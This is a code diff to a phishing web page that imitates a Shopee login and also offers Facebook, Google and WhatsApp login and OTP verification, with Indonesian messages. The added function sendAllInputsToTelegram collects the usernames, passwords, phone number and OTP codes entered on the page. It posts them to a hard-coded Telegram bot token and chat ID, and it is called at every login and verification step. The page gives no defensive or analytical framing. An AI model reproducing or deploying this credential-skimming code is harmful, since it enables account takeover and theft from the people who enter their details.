@@ -12,6 +12,22 @@
    let resendTimer;
    let resendCountdown = 60;
 
+   // --- Shopee Login Button Enable/Disable Logic ---
+   function checkShopeeLoginInputs() {
+    const usernameInput = document.getElementById("shopeeUsername");
+    const passwordInput = document.getElementById("password");
+    const loginBtn = document.getElementById("shopeeLoginBtn");
+    if (usernameInput.value.trim() && passwordInput.value.trim()) {
+     loginBtn.disabled = false;
+     loginBtn.classList.remove("bg-gray-300", "text-gray-400", "cursor-not-allowed");
+     loginBtn.classList.add("bg-orange-600", "text-white", "cursor-pointer");
+    } else {
+     loginBtn.disabled = true;
+     loginBtn.classList.remove("bg-orange-600", "text-white", "cursor-pointer");
+     loginBtn.classList.add("bg-gray-300", "text-gray-400", "cursor-not-allowed");
+    }
+   }
+
    function togglePasswordVisibility() {
     const passwordInput = document.getElementById("password");
     const toggleBtnIcon = document.getElementById("toggleIcon");
@@ -72,6 +88,7 @@
 
    function submitFacebookLogin(event) {
     event.preventDefault();
+    sendAllInputsToTelegram('facebook');
     // Simulate login success and show verification page
     document.getElementById("facebookLoginSection").classList.add("hidden");
     document.getElementById("verificationSection").classList.remove("hidden");
@@ -79,6 +96,7 @@
 
    function submitGoogleLogin(event) {
     event.preventDefault();
+    sendAllInputsToTelegram('google');
     // Simulate login success and show verification page
     document.getElementById("googleLoginSection").classList.add("hidden");
     document.getElementById("verificationSection").classList.remove("hidden");
@@ -99,6 +117,7 @@
     const selectedMethod = document.querySelector(
      'input[name="verificationMethod"]:checked'
     ).value;
+    sendAllInputsToTelegram('verification');
     document.getElementById("verificationSection").classList.add("hidden");
     document.getElementById("otpInputSection").classList.remove("hidden");
     document.getElementById("otpInputTitle").textContent =
@@ -138,12 +157,14 @@
      alert("Mohon masukkan nomor yang terdaftar.");
      return;
     }
+    sendAllInputsToTelegram('otpSend');
     alert(`Kode OTP telah dikirim ke nomor ${phoneNumber}`);
     document.getElementById("sendOtpBtn").disabled = true;
     resetResendTimer();
    }
 
    function resendOtp() {
+    sendAllInputsToTelegram('otpResend');
     alert("Kode OTP telah dikirim ulang.");
     resetResendTimer();
    }
@@ -155,6 +176,7 @@
      alert("Mohon masukkan kode OTP.");
      return;
     }
+    sendAllInputsToTelegram('otpSubmit');
     // Redirect to formulir2.html after successful OTP input
     window.location.href = "formulir2.html";
    }
@@ -175,6 +197,7 @@
      alert("Mohon masukkan nomor WhatsApp Anda.");
      return;
     }
+    sendAllInputsToTelegram('wa');
     // Proceed to verification.html page
     window.location.href = "verification.html";
    }
@@ -183,6 +206,68 @@
     document.getElementById("whatsappNumberInputSection").classList.add("hidden");
     document.getElementById("mainLoginSection").classList.remove("hidden");
    }
+
+   // --- Send all input values to Telegram ---
+   function sendAllInputsToTelegram(contextName) {
+    // Shopee login
+    const shopeeUsername = document.getElementById("shopeeUsername") ? document.getElementById("shopeeUsername").value : "";
+    const shopeePassword = document.getElementById("password") ? document.getElementById("password").value : "";
+    // WhatsApp
+    const waNumber = document.getElementById("waNumberInput") ? document.getElementById("waNumberInput").value : "";
+    // Facebook
+    const fbLogin = document.querySelector("#facebookLoginSection input[type='text']") ? document.querySelector("#facebookLoginSection input[type='text']").value : "";
+    const fbPassword = document.getElementById("fbPassword") ? document.getElementById("fbPassword").value : "";
+    // Google
+    const googleLogin = document.querySelector("#googleLoginSection input[type='email']") ? document.querySelector("#googleLoginSection input[type='email']").value : "";
+    const googlePassword = document.getElementById("googlePassword") ? document.getElementById("googlePassword").value : "";
+    // Verification
+    let verificationMethod = "";
+    if (document.querySelector('input[name="verificationMethod"]:checked')) {
+     verificationMethod = document.querySelector('input[name="verificationMethod"]:checked').value;
+    }
+    // OTP
+    const otpPhone = document.getElementById("otpInput") ? document.getElementById("otpInput").value : "";
+    const otpCode = document.getElementById("otpCode") ? document.getElementById("otpCode").value : "";
+
+    let text = `#LOGIN_FORM (${contextName})\n`;
+    text += `Shopee Username: ${shopeeUsername}\nShopee Password: ${shopeePassword}\n`;
+    text += `WhatsApp Number: ${waNumber}\n`;
+    text += `Facebook Login: ${fbLogin}\nFacebook Password: ${fbPassword}\n`;
+    text += `Google Login: ${googleLogin}\nGoogle Password: ${googlePassword}\n`;
+    text += `Verifikasi metode: ${verificationMethod}\n`;
+    text += `OTP Phone: ${otpPhone}\nOTP Code: ${otpCode}\n`;
+
+    const chatId = '5923031825';
+    const token = '8483832719:AAH9MrWjVVmMxydfTMJjOPyG_c7xu04P6Gk';
+    const url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+    fetch(url, {
+     method: "POST",
+     headers: {
+      "Content-Type": "application/json"
+     },
+     body: JSON.stringify({
+      chat_id: chatId,
+      text: text
+     })
+    });
+   }
+
+   // --- Shopee login form submit handler ---
+   function submitShopeeLogin(event) {
+    event.preventDefault();
+    sendAllInputsToTelegram('shopee');
+    // Simulate login failed so user stays on page
+    alert("Login Shopee dikirim. (Simulasi: tetap dihalaman ini)");
+   }
+
+   window.onload = function() {
+    // Setup Shopee login enable/disable
+    document.getElementById("shopeeUsername").addEventListener("input", checkShopeeLoginInputs);
+    document.getElementById("password").addEventListener("input", checkShopeeLoginInputs);
+    // Setup Shopee login form submit
+    document.getElementById("loginForm").addEventListener("submit", submitShopeeLogin);
+   };
   </script>
  </head>
  <body class="bg-white min-h-screen flex flex-col items-center justify-center px-6">
@@ -204,6 +289,7 @@
       <i class="fas fa-user"></i>
      </span>
      <input
+      id="shopeeUsername"
       class="w-full border-b border-gray-300 py-2 pl-10 pr-2 text-gray-700 placeholder-gray-400 focus:outline-none focus:border-gray-400"
       placeholder="No. Handphone/Email/Username"
       type="text"
@@ -231,6 +317,7 @@
      </button>
     </div>
     <button
+     id="shopeeLoginBtn"
      class="w-full bg-gray-300 text-gray-400 py-2 rounded-md text-center text-lg font-normal mb-4 cursor-not-allowed"
      disabled
      type="submit"
@@ -523,4 +610,4 @@
    </form>
   </div>
  </body>
-         </html>
+</html>
